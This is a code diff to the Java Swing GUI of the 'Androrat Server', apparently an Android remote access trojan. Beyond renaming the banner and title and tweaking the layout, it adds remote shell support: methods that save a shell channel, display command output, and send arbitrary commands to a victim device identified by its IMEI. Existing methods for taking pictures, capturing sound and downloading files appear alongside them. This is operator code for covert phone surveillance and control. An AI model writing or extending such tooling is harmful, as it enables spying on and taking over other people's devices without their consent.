@@ -90,15 +90,15 @@ public class GUI extends javax.swing.JFrame {
         userTable.setModel(model);
         userTable.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
         userTable.getColumnModel().getColumn(0).setCellRenderer(new MyRenderer());
-        logPanel.append(Color.blue, "*** ANDRORAT SERVEUR ***\n" +
-        		"Authors : A.Bertrand, A.Akimov, R.David, P.Junk\nLaunch at " +
-        		(new Date(System.currentTimeMillis()))+"\n" + 
+        logPanel.append(Color.blue, "*** ANDRORAT SERVER ***\n" +
+        		"Authors : A.Bertrand, A.Akimov, R.David, P.Junk\n" +
+			"Launch at " + (new Date(System.currentTimeMillis()))+"\n" + 
         		"On port : "+ port +"\n");
         
         centrerTable(userTable);
         
         this.setLocationRelativeTo(null);
-        this.setTitle("Androrat Project");
+        this.setTitle("Androrat Server");
         this.setVisible(true);
     }
     
@@ -307,6 +307,11 @@ public class GUI extends javax.swing.JFrame {
     	user.updatePicture(picture);
     }
     
+    public void updateCommandOutput(String imei, byte[] output) {
+    	UserGUI user = guiMap.get(imei);
+    	user.updateCommandOutput(output);
+    }
+    
     public void addSoungBytes(String imei, byte[] data) {
     	UserGUI user = guiMap.get(imei);
     	user.addSoundBytes(data);
@@ -383,6 +388,11 @@ public class GUI extends javax.swing.JFrame {
     	user.savePictureChannel(channel);
     }
     
+    public void saveShellChannel(String imei, int channel) {
+    	UserGUI user = guiMap.get(imei);
+    	user.saveShellChannel(channel);
+    }
+    
     public void saveSoundChannel(String imei, int channel) {
     	UserGUI user = guiMap.get(imei);
     	user.saveSoundChannel(channel);
@@ -438,6 +448,10 @@ public class GUI extends javax.swing.JFrame {
     
     public void fireTakePicture(String imei, Long camid) {
     	server.commandSender(imei, Protocol.GET_PICTURE, EncoderHelper.encodeLong(camid));
+    }
+    
+    public void fireSendCommand(String imei, String cmd) {
+    	server.commandSender(imei, Protocol.SEND_CMD, cmd.getBytes());
     }
     
     public void fireFileDownload(String imei, String path, String downPath, String downName) {
@@ -707,8 +721,8 @@ public class GUI extends javax.swing.JFrame {
         splitPane.setDividerLocation(200);
         userTable = new javax.swing.JTable();
         userTable.setRowMargin(3);
-        userTable.setRowHeight(48);
-        userTable.setFont(new Font("Dialog", Font.PLAIN, 14));
+        userTable.setRowHeight(38);
+        //userTable.setFont(new Font("Dialog", Font.PLAIN, 14));
         userTable.setAutoResizeMode(JTable.AUTO_RESIZE_NEXT_COLUMN);
         userTable.addMouseListener(new MouseAdapter() {
         	@Override
